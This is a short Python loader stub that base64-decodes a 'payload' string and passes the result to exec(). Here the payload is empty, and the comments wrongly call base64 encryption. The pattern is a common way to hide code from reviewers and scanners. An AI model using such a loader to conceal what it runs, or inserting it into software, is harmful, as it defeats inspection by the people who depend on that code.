import sys
import base64

# === ENCRYPTED PAYLOAD (Base64) ===
payload = ''

def decrypt_and_run():
    try:
        decoded = base64.b64decode(payload)
        exec(decoded.decode("utf-8"), globals())
    except Exception as e:
        print(f"[!] Decryption Error: {e}")
        sys.exit(1)

if __name__ == "__main__":
    decrypt_and_run()
